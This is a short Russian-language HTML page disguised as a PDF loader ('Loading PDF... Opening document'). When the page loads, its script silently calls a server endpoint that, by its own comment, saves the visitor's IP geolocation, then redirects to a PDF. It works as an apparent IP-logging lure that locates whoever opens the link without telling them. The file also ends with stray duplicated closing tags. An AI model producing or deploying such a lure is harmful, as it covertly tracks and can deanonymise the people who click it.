<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Открытие PDF</title>
</head>
<body>
    <h1>Загрузка PDF...</h1>
    <p>Открытие документа... </p>
    <script>
        // Отправляем запрос на сохранение IP-геолокации
        async function saveIpLocation() {
            try {
                const response = await fetch('/api/save-ip-location', {
                    method: 'GET',
                    headers: { 'Content-Type': 'application/json' }
                });
                const result = await response.json();
                if (result.success) {
                    window.location.href = result.redirect || '/sample.pdf';
                } else {
                    alert('Ошибка при сохранении данных');
                }
            } catch (err) {
                console.error('Ошибка:', err);
                alert('Ошибка сервера');
            }
        }

        // Запускаем сразу
        saveIpLocation();
    </script>
</body>
</html>
    </script>
</body>
</html>
